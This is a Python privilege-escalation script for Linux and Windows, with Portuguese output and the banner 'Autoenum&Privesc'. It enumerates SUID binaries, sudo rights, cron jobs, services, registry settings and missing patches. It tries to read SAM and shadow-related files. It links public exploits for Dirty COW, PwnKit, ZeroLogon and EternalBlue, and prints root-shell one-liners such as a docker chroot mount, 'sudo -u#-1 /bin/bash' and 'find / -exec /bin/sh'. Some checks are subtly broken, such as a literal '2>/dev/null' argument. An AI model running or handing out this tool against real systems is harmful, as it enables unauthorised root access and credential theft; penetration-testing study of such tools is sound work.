#!/usr/bin/env python3

import os
import sys
import platform
import subprocess
import socket
import shutil
import tempfile
import json
import time
import ctypes
from datetime import datetime

class Cores:
    VERMELHO = '\033[91m'
    VERDE = '\033[92m'
    AMARELO = '\033[93m'
    AZUL = '\033[94m'
    MAGENTA = '\033[95m'
    CIANO = '\033[96m'
    BRANCO = '\033[97m'
    RESET = '\033[0m'
    NEGRITO = '\033[1m'

class AutoEnum:
    def __init__(self):
        self.sistema = platform.system()
        self.versao = platform.version()
        self.arquitetura = platform.machine()
        self.hostname = socket.gethostname()
        self.usuario_atual = os.getenv('USER') or os.getenv('USERNAME')
        self.eh_windows = self.sistema == "Windows"
        self.eh_linux = self.sistema == "Linux"
        self.uid = None
        self.gid = None
        self.diretorio_trabalho = os.getcwd()
        self.saida = []
        self.vulnerabilidades = []
        
        if self.eh_windows:
            sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
            sys.stderr.reconfigure(encoding='utf-8', errors='ignore')
        
        if self.eh_linux:
            self.uid = os.getuid()
            self.gid = os.getgid()
        elif self.eh_windows:
            self.verificar_privilegios_windows()

    def executar_comando(self, comando, timeout=10):
        try:
            if self.eh_windows:
                resultado = subprocess.run(
                    comando, 
                    capture_output=True, 
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore',
                    shell=True
                )
            else:
                resultado = subprocess.run(
                    comando, 
                    capture_output=True, 
                    text=True, 
                    timeout=timeout,
                    errors='ignore'
                )
            return resultado
        except subprocess.TimeoutExpired:
            return None
        except Exception as e:
            return None

    def verificar_privilegios_windows(self):
        try:
            resultado = self.executar_comando('whoami /groups', timeout=5)
            if resultado and resultado.stdout:
                if 'S-1-5-32-544' in resultado.stdout or 'Administrators' in resultado.stdout:
                    self.vulnerabilidades.append("USUÁRIO NO GRUPO ADMINISTRADORES")
                    self.saida.append(f"{Cores.AMARELO}[!] Usuário pertence ao grupo Administradores{Cores.RESET}")
            
            resultado_admin = self.executar_comando('net session', timeout=5)
            if resultado_admin and resultado_admin.returncode == 0:
                self.saida.append(f"{Cores.VERDE}[+] Executando com privilégios elevados{Cores.RESET}")
                self.vulnerabilidades.append("PRIVILÉGIOS ELEVADOS (ADMIN)")
        except:
            pass

    def banner(self):
        banner = f"""
{Cores.CIANO}{Cores.NEGRITO}
    ╔══════════════════════════════════════════════════════════╗
    ║ Autoenum&Privesc cod(3)d by: sc4ry                       ║
    ╚══════════════════════════════════════════════════════════╝
{Cores.RESET}
        """
        print(banner)

    def info_basica(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] INFORMACOES BÁSICAS DO SISTEMA{Cores.RESET}")
        self.saida.append(f"{Cores.VERDE}→ Sistema Operacional:{Cores.RESET} {self.sistema}")
        self.saida.append(f"{Cores.VERDE}→ Versão:{Cores.RESET} {self.versao}")
        self.saida.append(f"{Cores.VERDE}→ Arquitetura:{Cores.RESET} {self.arquitetura}")
        self.saida.append(f"{Cores.VERDE}→ Hostname:{Cores.RESET} {self.hostname}")
        self.saida.append(f"{Cores.VERDE}→ Usuário Atual:{Cores.RESET} {self.usuario_atual}")
        
        if self.eh_linux:
            self.saida.append(f"{Cores.VERDE}→ UID:{Cores.RESET} {self.uid}")
            self.saida.append(f"{Cores.VERDE}→ GID:{Cores.RESET} {self.gid}")
        
        self.saida.append(f"{Cores.VERDE}→ Diretório de Trabalho:{Cores.RESET} {self.diretorio_trabalho}")

    def verificar_root_windows(self):
        if self.eh_windows:
            try:
                resultado = self.executar_comando('whoami /priv', timeout=5)
                if resultado and resultado.stdout:
                    self.saida.append(f"\n{Cores.NEGRITO}[+] PRIVILÉGIOS DO USUÁRIO WINDOWS{Cores.RESET}")
                    self.saida.append(resultado.stdout)
                    
                    privilegios_criticos = [
                        'SeDebugPrivilege',
                        'SeImpersonatePrivilege',
                        'SeAssignPrimaryTokenPrivilege',
                        'SeTcbPrivilege',
                        'SeBackupPrivilege',
                        'SeRestorePrivilege',
                        'SeLoadDriverPrivilege',
                        'SeTakeOwnershipPrivilege'
                    ]
                    
                    for priv in privilegios_criticos:
                        if priv in resultado.stdout and 'Enabled' in resultado.stdout:
                            self.vulnerabilidades.append(f"PRIVILÉGIO CRÍTICO: {priv}")
                            self.saida.append(f"{Cores.AMARELO}[!] {priv} habilitado!{Cores.RESET}")
                    
                    if 'SeImpersonatePrivilege' in resultado.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] Possível escalação via Potato Attack!{Cores.RESET}")
                        self.saida.append("Exploits: JuicyPotato, RoguePotato, PrintSpoofer")
                        self.vulnerabilidades.append("SEIMPERSONATE - POTATO ATTACKS")
                    
            except:
                pass
        return False

    def verificar_sudo(self):
        if self.eh_linux:
            try:
                resultado = self.executar_comando(['sudo', '-l'], timeout=5)
                if resultado and resultado.stdout:
                    if 'NOPASSWD' in resultado.stdout or '(ALL)' in resultado.stdout:
                        self.saida.append(f"\n{Cores.AMARELO}[!] POSSIBILIDADE DE ESCALAÇÃO VIA SUDO:{Cores.RESET}")
                        self.saida.append(resultado.stdout)
                        self.vulnerabilidades.append("SUDO MISCONFIGURATION")
                        return True
            except:
                pass
        return False

    def verificar_suid(self):
        if self.eh_linux:
            self.saida.append(f"\n{Cores.NEGRITO}[+] BINÁRIOS COM SUID{Cores.RESET}")
            try:
                resultado = self.executar_comando(['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'], timeout=30)
                if resultado and resultado.stdout:
                    binarios = resultado.stdout.strip().split('\n')
                    for binario in binarios[:20]:
                        self.saida.append(f"{Cores.CIANO}→{Cores.RESET} {binario}")
                        binario_nome = os.path.basename(binario)
                        if binario_nome in ['find', 'vim', 'nano', 'bash', 'sh', 'python', 'python3', 'perl', 'ruby', 'less', 'more', 'awk', 'sed', 'cp', 'mv', 'cat', 'tar', 'zip', 'unzip', 'chmod', 'chown', 'mount', 'umount', 'systemctl', 'service', 'docker', 'lxc', 'screen', 'tmux']:
                            self.vulnerabilidades.append(f"SUID BINARY: {binario_nome}")
            except:
                pass

    def verificar_servicos_windows(self):
        if self.eh_windows:
            self.saida.append(f"\n{Cores.NEGRITO}[+] SERVIÇOS WINDOWS{Cores.RESET}")
            try:
                resultado = self.executar_comando('sc query type= service state= all', timeout=10)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout[:2000])
                
                self.saida.append(f"\n{Cores.NEGRITO}[+] SERVIÇOS COM PERMISSÕES FRACAS{Cores.RESET}")
                resultado2 = self.executar_comando('wmic service get Name,State,StartMode,PathName', timeout=10)
                if resultado2 and resultado2.stdout:
                    self.saida.append(resultado2.stdout)
                
                self.saida.append(f"\n{Cores.NEGRITO}[+] SERVIÇOS VULNERÁVEIS CONHECIDOS{Cores.RESET}")
                resultado3 = self.executar_comando('wmic service get Name,DisplayName,PathName /format:list', timeout=10)
                
                if resultado3 and resultado3.stdout:
                    for linha in resultado3.stdout.split('\n'):
                        if 'PathName=' in linha:
                            caminho = linha.split('=')[1].strip()
                            if caminho and ' ' in caminho and not caminho.startswith('"'):
                                if caminho.split(' ')[0].endswith('.exe'):
                                    self.vulnerabilidades.append(f"UNQUOTED SERVICE PATH: {caminho}")
                                    self.saida.append(f"{Cores.AMARELO}[!] Unquoted Service Path: {caminho}{Cores.RESET}")
            except:
                pass

    def verificar_registro_windows(self):
        if self.eh_windows:
            self.saida.append(f"\n{Cores.NEGRITO}[+] CONFIGURAÇÕES DO REGISTRO WINDOWS{Cores.RESET}")
            try:
                import winreg
                
                chaves_importantes = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                    r"SYSTEM\CurrentControlSet\Services"
                ]
                
                for chave in chaves_importantes:
                    try:
                        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, chave, 0, winreg.KEY_READ)
                        self.saida.append(f"{Cores.CIANO}→ Registro: {chave}{Cores.RESET}")
                        
                        if 'Policies\System' in chave:
                            try:
                                valor, _ = winreg.QueryValueEx(reg, "EnableLUA")
                                if valor == 0:
                                    self.vulnerabilidades.append("UAC DESABILITADO")
                                    self.saida.append(f"{Cores.AMARELO}[!] UAC desabilitado!{Cores.RESET}")
                            except:
                                pass
                            
                            try:
                                valor, _ = winreg.QueryValueEx(reg, "ConsentPromptBehaviorAdmin")
                                if valor == 0:
                                    self.vulnerabilidades.append("UAC EM MODO FRACO")
                                    self.saida.append(f"{Cores.AMARELO}[!] UAC em modo fraco!{Cores.RESET}")
                            except:
                                pass
                        
                        winreg.CloseKey(reg)
                    except:
                        pass
                
                try:
                    reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                       r"SOFTWARE\Policies\Microsoft\Windows\Installer", 
                                       0, winreg.KEY_READ)
                    valor, _ = winreg.QueryValueEx(reg, "AlwaysInstallElevated")
                    if valor == 1:
                        self.vulnerabilidades.append("ALWAYSINSTALLELEVATED ATIVADO")
                        self.saida.append(f"{Cores.AMARELO}[!] AlwaysInstallElevated ativado!{Cores.RESET}")
                    winreg.CloseKey(reg)
                except:
                    pass
                    
            except:
                pass

    def verificar_capabilities(self):
        if self.eh_linux:
            self.saida.append(f"\n{Cores.NEGRITO}[+] CAPABILITIES DO SISTEMA{Cores.RESET}")
            try:
                resultado = self.executar_comando(['getcap', '-r', '/', '2>/dev/null'], timeout=30)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout)
                    if 'cap_setuid' in resultado.stdout or 'cap_setgid' in resultado.stdout:
                        self.vulnerabilidades.append("CAPABILITIES SETUID/SETGID")
            except:
                pass

    def verificar_cron(self):
        if self.eh_linux:
            self.saida.append(f"\n{Cores.NEGRITO}[+] TAREFAS CRON E PERMISSÕES{Cores.RESET}")
            try:
                resultado = self.executar_comando(['ls', '-la', '/etc/cron*'], timeout=5)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout)
                
                arquivos_cron = ['/etc/crontab', '/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/', 
                               '/etc/cron.monthly/', '/etc/cron.weekly/']
                
                for arquivo in arquivos_cron:
                    try:
                        resultado2 = self.executar_comando(['ls', '-la', arquivo], timeout=3)
                        if resultado2 and resultado2.stdout:
                            self.saida.append(f"{Cores.CIANO}→ {arquivo}{Cores.RESET}")
                            self.saida.append(resultado2.stdout)
                            
                            for linha in resultado2.stdout.split('\n'):
                                if linha.startswith('-rw') and 'root' not in linha:
                                    self.vulnerabilidades.append(f"CRON WRITABLE: {arquivo}")
                                    self.saida.append(f"{Cores.AMARELO}[!] Arquivo cron com permissões fracas: {linha}{Cores.RESET}")
                    except:
                        pass
            except:
                pass
        elif self.eh_windows:
            self.saida.append(f"\n{Cores.NEGRITO}[+] TAREFAS AGENDADAS WINDOWS{Cores.RESET}")
            try:
                resultado = self.executar_comando('schtasks /query /fo LIST /v', timeout=10)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout[:2000])
                
                resultado2 = self.executar_comando('schtasks /query /fo CSV /v', timeout=10)
                
                if resultado2 and resultado2.stdout:
                    for linha in resultado2.stdout.split('\n'):
                        if 'Task To Run' in linha or 'Run As User' in linha:
                            self.saida.append(linha)
                            
                            if 'SYSTEM' in linha and 'Task To Run' in linha:
                                caminho = linha.split(',')[1] if len(linha.split(',')) > 1 else ""
                                if caminho and not caminho.startswith('"') and ' ' in caminho:
                                    self.vulnerabilidades.append(f"UNQUOTED TASK PATH: {caminho}")
                                    self.saida.append(f"{Cores.AMARELO}[!] Tarefa com caminho não quotado: {caminho}{Cores.RESET}")
            except:
                pass

    def verificar_servicos(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] SERVIÇOS EM EXECUÇÃO{Cores.RESET}")
        try:
            if self.eh_linux:
                resultado = self.executar_comando(['systemctl', 'list-units', '--type=service', '--state=running'], timeout=10)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout[:1000])
                
                resultado2 = self.executar_comando(['netstat', '-tlnp'], timeout=5)
                if resultado2 and resultado2.stdout:
                    self.saida.append(f"\n{Cores.NEGRITO}[+] PORTAS ABERTAS{Cores.RESET}")
                    self.saida.append(resultado2.stdout)
                
            elif self.eh_windows:
                resultado = self.executar_comando('netstat -ano', timeout=10)
                if resultado and resultado.stdout:
                    self.saida.append(f"\n{Cores.NEGRITO}[+] CONEXÕES E PORTAS WINDOWS{Cores.RESET}")
                    self.saida.append(resultado.stdout[:1000])
                
                self.saida.append(f"\n{Cores.NEGRITO}[+] PROCESSOS EM EXECUÇÃO{Cores.RESET}")
                resultado2 = self.executar_comando('tasklist /v', timeout=10)
                if resultado2 and resultado2.stdout:
                    self.saida.append(resultado2.stdout[:1000])
        except:
            pass

    def verificar_versoes_vulneraveis(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] BANCOS DE DADOS DE EXPLOITS{Cores.RESET}")
        
        if self.eh_linux:
            banco_exploits = {
                'sudo': ['1.8.0', '1.8.2', '1.8.3', '1.8.4', '1.8.5', '1.8.6', '1.8.7', '1.8.8', '1.8.9', '1.8.10', '1.8.11', '1.8.12', '1.8.13', '1.8.14', '1.8.15', '1.8.16', '1.8.17', '1.8.18', '1.8.19', '1.8.20', '1.8.21', '1.8.22', '1.8.23', '1.8.24', '1.8.25', '1.8.26', '1.8.27'],
                'dirtycow': ['2.6.22', '3.0', '3.1', '3.2', '3.3', '3.4', '3.5', '3.6', '3.7', '3.8', '3.9', '4.0', '4.1', '4.2', '4.3', '4.4'],
                'polkit': ['0.105', '0.113', '0.114', '0.115', '0.116', '0.117', '0.118', '0.119'],
                'glibc': ['2.12', '2.13', '2.14', '2.15', '2.16', '2.17', '2.18', '2.19', '2.20', '2.21', '2.22', '2.23', '2.24', '2.25']
            }
            
            for programa, versoes in banco_exploits.items():
                try:
                    if programa == 'dirtycow':
                        resultado = self.executar_comando(['uname', '-r'], timeout=3)
                        if resultado and resultado.stdout:
                            versao_atual = resultado.stdout.strip()
                        else:
                            continue
                    else:
                        resultado = self.executar_comando([programa, '--version'], timeout=3)
                        if resultado and resultado.stdout:
                            versao_atual = resultado.stdout.split('\n')[0]
                        else:
                            continue
                    
                    self.saida.append(f"{Cores.CIANO}→ {programa}: {versao_atual}{Cores.RESET}")
                    
                    for versao_vuln in versoes:
                        if versao_vuln in versao_atual:
                            self.vulnerabilidades.append(f"VERSÃO VULNERÁVEL: {programa} {versao_atual}")
                            self.saida.append(f"{Cores.AMARELO}[!] {programa} versão {versao_atual} é vulnerável!{Cores.RESET}")
                except:
                    pass
                    
        elif self.eh_windows:
            try:
                resultado = self.executar_comando('systeminfo', timeout=30)
                if resultado and resultado.stdout:
                    self.saida.append(resultado.stdout[:1000])
                    
                    if 'Microsoft Windows' in resultado.stdout:
                        if 'Windows 7' in resultado.stdout or 'Windows Server 2008' in resultado.stdout:
                            self.vulnerabilidades.append("WINDOWS DESATUALIZADO (EOL)")
                            self.saida.append(f"{Cores.AMARELO}[!] Sistema Windows antigo/desatualizado{Cores.RESET}")
                        
                        if 'Windows XP' in resultado.stdout:
                            self.vulnerabilidades.append("WINDOWS XP DETECTADO")
                            self.saida.append(f"{Cores.AMARELO}[!] Windows XP extremamente vulnerável!{Cores.RESET}")
                
                resultado_hotfix = self.executar_comando('wmic qfe list', timeout=30)
                
                if resultado_hotfix and resultado_hotfix.stdout:
                    hotfixes_importantes = ['KB4013389', 'KB4012212', 'KB4012213', 'KB4012214', 'KB4012215', 'KB4012216', 'KB4012217']
                    
                    for hotfix in hotfixes_importantes:
                        if hotfix not in resultado_hotfix.stdout:
                            self.vulnerabilidades.append(f"HOTFIX AUSENTE: {hotfix}")
                            self.saida.append(f"{Cores.AMARELO}[!] Hotfix {hotfix} não instalado!{Cores.RESET}")
                        
            except:
                pass

    def verificar_docker(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] DOCKER E CONTÊINERES{Cores.RESET}")
        try:
            resultado = self.executar_comando(['docker', 'ps'], timeout=5)
            if resultado and resultado.returncode == 0:
                self.saida.append(resultado.stdout)
                self.vulnerabilidades.append("DOCKER DISPONÍVEL")
                
                resultado_grupos = self.executar_comando(['id'], timeout=3)
                if resultado_grupos and resultado_grupos.stdout and 'docker' in resultado_grupos.stdout:
                    self.vulnerabilidades.append("USUÁRIO NO GRUPO DOCKER")
                    self.saida.append(f"{Cores.VERDE}[+] Usuário no grupo docker - possível escalação!{Cores.RESET}")
                    self.saida.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        except:
            pass

    def verificar_arquivos_importantes(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] ARQUIVOS IMPORTANTES E PERMISSÕES{Cores.RESET}")
        
        if self.eh_linux:
            arquivos = ['/etc/passwd', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/hosts', '/etc/resolv.conf']
            for arquivo in arquivos:
                try:
                    resultado = self.executar_comando(['ls', '-la', arquivo], timeout=3)
                    if resultado and resultado.stdout:
                        self.saida.append(resultado.stdout.strip())
                        
                        if '/etc/shadow' in arquivo:
                            linhas = resultado.stdout.strip().split('\n')
                            for linha in linhas:
                                if 'rw' in linha and 'root' not in linha:
                                    self.vulnerabilidades.append("SHADOW FILE READABLE")
                                    self.saida.append(f"{Cores.AMARELO}[!] /etc/shadow legível por outros usuários!{Cores.RESET}")
                        
                        if '/etc/passwd' in arquivo:
                            linhas = resultado.stdout.strip().split('\n')
                            for linha in linhas:
                                if 'w' in linha and 'root' not in linha:
                                    self.vulnerabilidades.append("PASSWD FILE WRITABLE")
                                    self.saida.append(f"{Cores.AMARELO}[!] /etc/passwd gravável por outros usuários!{Cores.RESET}")
                except:
                    pass
                    
        elif self.eh_windows:
            arquivos = [
                r'C:\Windows\System32\config\SAM',
                r'C:\Windows\System32\config\SYSTEM',
                r'C:\Windows\System32\config\SECURITY',
                r'C:\Windows\System32\config\SOFTWARE'
            ]
            
            for arquivo in arquivos:
                self.saida.append(f"{Cores.CIANO}→ {arquivo}{Cores.RESET}")
                
                if os.path.exists(arquivo):
                    try:
                        with open(arquivo, 'rb') as f:
                            self.saida.append(f"{Cores.AMARELO}[!] Arquivo legível: {arquivo}{Cores.RESET}")
                            self.vulnerabilidades.append(f"ARQUIVO SENSÍVEL LEGÍVEL: {arquivo}")
                    except:
                        self.saida.append(f"{Cores.VERDE}→ Arquivo protegido (normal){Cores.RESET}")

    def buscar_exploits_publicos(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] BUSCANDO EXPLOITS PÚBLICOS CONHECIDOS{Cores.RESET}")
        
        exploits_conhecidos = {
            'CVE-2016-5195': {
                'nome': 'Dirty COW',
                'descricao': 'Race condition no subsistema de memória do kernel Linux',
                'sistemas': ['Linux'],
                'kernel_afetado': ['2.6.22', '4.8.3'],
                'exploit': 'https://www.exploit-db.com/exploits/40839',
                'compilacao': 'gcc -pthread dirty.c -o dirty -lcrypt'
            },
            'CVE-2021-3156': {
                'nome': 'Baron Samedit',
                'descricao': 'Heap-based buffer overflow no sudo',
                'sistemas': ['Linux'],
                'versoes_afetadas': ['1.8.2', '1.9.5p2'],
                'exploit': 'https://github.com/blasty/CVE-2021-3156',
                'compilacao': 'make'
            },
            'CVE-2021-4034': {
                'nome': 'PwnKit',
                'descricao': 'Polkit pkexec local privilege escalation',
                'sistemas': ['Linux'],
                'versoes_afetadas': ['0.105', '0.120'],
                'exploit': 'https://github.com/berdav/CVE-2021-4034',
                'compilacao': 'make'
            },
            'CVE-2019-14287': {
                'nome': 'Sudo Bypass',
                'descricao': 'Sudo pode ser contornado com UID -1',
                'sistemas': ['Linux'],
                'versoes_afetadas': ['1.8.27'],
                'exploit': 'sudo -u#-1 /bin/bash'
            },
            'CVE-2017-1000367': {
                'nome': 'Sudo LD_PRELOAD',
                'descricao': 'Sudo permite LD_PRELOAD com env_keep',
                'sistemas': ['Linux'],
                'exploit': 'C code with LD_PRELOAD'
            },
            'CVE-2020-1472': {
                'nome': 'ZeroLogon',
                'descricao': 'Netlogon elevation of privilege vulnerability',
                'sistemas': ['Windows'],
                'exploit': 'https://github.com/dirkjanm/CVE-2020-1472'
            },
            'CVE-2021-36934': {
                'nome': 'HiveNightmare',
                'descricao': 'Windows Elevation of Privilege Vulnerability',
                'sistemas': ['Windows'],
                'exploit': 'https://github.com/GossiTheDog/HiveNightmare'
            },
            'MS16-032': {
                'nome': 'Secondary Logon Handle',
                'descricao': 'Microsoft Windows Secondary Logon Service privilege escalation',
                'sistemas': ['Windows'],
                'exploit': 'https://www.exploit-db.com/exploits/39719'
            },
            'MS17-010': {
                'nome': 'EternalBlue',
                'descricao': 'SMBv1 vulnerability',
                'sistemas': ['Windows'],
                'exploit': 'https://github.com/worawit/MS17-010'
            }
        }
        
        for cve, info in exploits_conhecidos.items():
            if self.sistema in info.get('sistemas', []):
                self.saida.append(f"\n{Cores.AMARELO}→ {cve} - {info['nome']}{Cores.RESET}")
                self.saida.append(f"  {Cores.CIANO}Descrição:{Cores.RESET} {info['descricao']}")
                self.saida.append(f"  {Cores.CIANO}Exploit:{Cores.RESET} {info.get('exploit', 'N/A')}")
                
                if 'compilacao' in info:
                    self.saida.append(f"  {Cores.CIANO}Compilação:{Cores.RESET} {info['compilacao']}")
                
                try:
                    if self.eh_linux and 'kernel_afetado' in info:
                        resultado_kernel = self.executar_comando(['uname', '-r'], timeout=3)
                        if resultado_kernel and resultado_kernel.stdout:
                            kernel = resultado_kernel.stdout.strip()
                            if info['kernel_afetado'][0] <= kernel <= info['kernel_afetado'][1]:
                                self.saida.append(f"  {Cores.VERDE}[VULNERÁVEL]{Cores.RESET} Kernel {kernel} está na faixa afetada")
                                self.vulnerabilidades.append(f"{cve} - {info['nome']}")
                    
                    elif self.eh_windows and 'MS17-010' in cve:
                        resultado_smb = self.executar_comando('netstat -an', timeout=5)
                        if resultado_smb and resultado_smb.stdout and ':445' in resultado_smb.stdout:
                            self.saida.append(f"  {Cores.AMARELO}[!] Porta 445 aberta - possível vulnerabilidade!{Cores.RESET}")
                            self.vulnerabilidades.append(f"{cve} - {info['nome']}")
                            
                except:
                    pass

    def escalar_privilegios(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] TENTATIVAS DE ESCALAÇÃO DE PRIVILÉGIOS{Cores.RESET}")
        
        if self.eh_linux and self.uid == 0:
            return True
        
        if self.eh_windows:
            try:
                resultado = self.executar_comando('whoami /groups', timeout=3)
                if resultado and resultado.stdout and 'S-1-5-32-544' in resultado.stdout:
                    self.saida.append(f"{Cores.VERDE}[+] Já é administrador!{Cores.RESET}")
                    return True
            except:
                pass
        
        if self.eh_linux:
            try:
                resultado = self.executar_comando(['id'], timeout=3)
                if resultado and resultado.stdout:
                    
                    if 'docker' in resultado.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] Usuário no grupo docker - possível escalação!{Cores.RESET}")
                        self.saida.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
                        self.vulnerabilidades.append("DOCKER GROUP PRIVILEGE ESCALATION")
                    
                    if 'lxd' in resultado.stdout or 'lxc' in resultado.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] Usuário no grupo lxd/lxc - possível escalação!{Cores.RESET}")
                        self.vulnerabilidades.append("LXD GROUP PRIVILEGE ESCALATION")
                
                resultado_sudo = self.executar_comando(['sudo', '-l'], timeout=3)
                if resultado_sudo and resultado_sudo.stdout:
                    if 'ALL' in resultado_sudo.stdout or 'NOPASSWD' in resultado_sudo.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] Sudo configurado incorretamente!{Cores.RESET}")
                        self.saida.append("sudo su -")
                        self.vulnerabilidades.append("SUDO PRIVILEGE ESCALATION")
                
                for binario in ['find', 'vim', 'nano', 'less', 'more', 'awk', 'sed', 'python', 'python3']:
                    try:
                        resultado_suid = self.executar_comando(['ls', '-la', f'/usr/bin/{binario}'], timeout=3)
                        if resultado_suid and resultado_suid.stdout:
                            if 'rws' in resultado_suid.stdout or 'r-s' in resultado_suid.stdout:
                                self.saida.append(f"{Cores.VERDE}[+] {binario} com SUID!{Cores.RESET}")
                                
                                if binario == 'find':
                                    self.saida.append(f"find / -exec /bin/sh \\; -quit")
                                elif binario in ['vim', 'nano']:
                                    self.saida.append(f"{binario} -c ':!/bin/sh'")
                                elif binario in ['less', 'more']:
                                    self.saida.append(f"{binario} /etc/passwd")
                                    self.saida.append("!/bin/sh")
                                elif binario in ['awk', 'sed']:
                                    self.saida.append(f"{binario} 'BEGIN {{system(\"/bin/sh\")}}'")
                                elif binario in ['python', 'python3']:
                                    self.saida.append(f"{binario} -c 'import os; os.system(\"/bin/sh\")'")
                                
                                self.vulnerabilidades.append(f"SUID {binario.upper()} PRIVILEGE ESCALATION")
                    except:
                        pass
                        
            except Exception as e:
                self.saida.append(f"Erro durante verificação: {e}")
                
        elif self.eh_windows:
            self.verificar_root_windows()
            self.verificar_servicos_windows()
            self.verificar_registro_windows()
            
            try:
                resultado = self.executar_comando('whoami /priv', timeout=3)
                
                if resultado and resultado.stdout:
                    if 'SeImpersonatePrivilege' in resultado.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] SeImpersonatePrivilege habilitado!{Cores.RESET}")
                        self.saida.append("Usar JuicyPotato ou PrintSpoofer para escalação")
                        self.vulnerabilidades.append("SEIMPERSONATE PRIVILEGE ESCALATION")
                    
                    if 'SeDebugPrivilege' in resultado.stdout:
                        self.saida.append(f"{Cores.VERDE}[+] SeDebugPrivilege habilitado!{Cores.RESET}")
                        self.saida.append("Possível usar Mimikatz para extrair credenciais")
                        self.vulnerabilidades.append("SEDEBUG PRIVILEGE ESCALATION")
                    
            except:
                pass

    def gerar_relatorio(self):
        self.saida.append(f"\n{Cores.NEGRITO}[+] RELATÓRIO FINAL{Cores.RESET}")
        self.saida.append(f"{'='*60}")
        
        if self.vulnerabilidades:
            self.saida.append(f"\n{Cores.VERMELHO}[!] VULNERABILIDADES ENCONTRADAS:{Cores.RESET}")
            for vuln in self.vulnerabilidades:
                self.saida.append(f"{Cores.VERMELHO}→ {vuln}{Cores.RESET}")
        else:
            self.saida.append(f"\n{Cores.VERDE}[+] Nenhuma vulnerabilidade crítica encontrada automaticamente{Cores.RESET}")
        
        self.saida.append(f"\n{Cores.NEGRITO}[+] RECOMENDAÇÕES DE EXPLORAÇÃO{Cores.RESET}")
        
        if self.eh_linux:
            self.saida.append("1. Verificar exploits específicos para a versão do kernel")
            self.saida.append("2. Buscar por binários com permissões incorretas")
            self.saida.append("3. Verificar configurações de sudo")
            self.saida.append("4. Procurar por tarefas cron com permissões erradas")
            self.saida.append("5. Analisar serviços rodando como root")
            self.saida.append("6. Verificar grupos com privilégios especiais")
            self.saida.append("7. Testar exploits de kernel conhecidos")
            self.saida.append("8. Verificar capabilities em binários")
            
        elif self.eh_windows:
            self.saida.append("1. Verificar Unquoted Service Paths")
            self.saida.append("2. Analisar permissões de serviços")
            self.saida.append("3. Verificar AlwaysInstallElevated")
            self.saida.append("4. Procurar por hotfixes ausentes")
            self.saida.append("5. Testar Potato Attacks (JuicyPotato, RoguePotato)")
            self.saida.append("6. Verificar configurações de UAC")
            self.saida.append("7. Analisar tarefas agendadas com permissões fracas")
            self.saida.append("8. Verificar DLL hijacking em serviços")

    def salvar_saida(self):
        nome_arquivo = f"autoenum_{self.hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(nome_arquivo, 'w', encoding='utf-8', errors='ignore') as f:
                f.write('\n'.join(self.saida))
            print(f"\n{Cores.VERDE}[+] Relatório salvo em: {nome_arquivo}{Cores.RESET}")
            return nome_arquivo
        except:
            print(f"\n{Cores.AMARELO}[!] Não foi possível salvar o relatório{Cores.RESET}")
            return None

    def executar(self):
        self.banner()
        self.info_basica()
        
        if self.eh_linux:
            if not self.uid == 0:
                self.verificar_sudo()
            self.verificar_suid()
            self.verificar_capabilities()
            self.verificar_cron()
        elif self.eh_windows:
            self.verificar_root_windows()
            self.verificar_servicos_windows()
            self.verificar_registro_windows()
            self.verificar_cron()
        
        self.verificar_servicos()
        self.verificar_versoes_vulneraveis()
        self.verificar_docker()
        self.verificar_arquivos_importantes()
        self.buscar_exploits_publicos()
        self.escalar_privilegios()
        self.gerar_relatorio()
        
        print('\n'.join(self.saida))
        self.salvar_saida()

if __name__ == "__main__":
    try:
        if sys.platform == "win32":
            os.system('color')
        enum = AutoEnum()
        enum.executar()
    except KeyboardInterrupt:
        print(f"\n{Cores.AMARELO}[!] Execução interrompida pelo usuário{Cores.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Cores.VERMELHO}[!] Erro durante execução: {e}{Cores.RESET}")
        sys.exit(1)
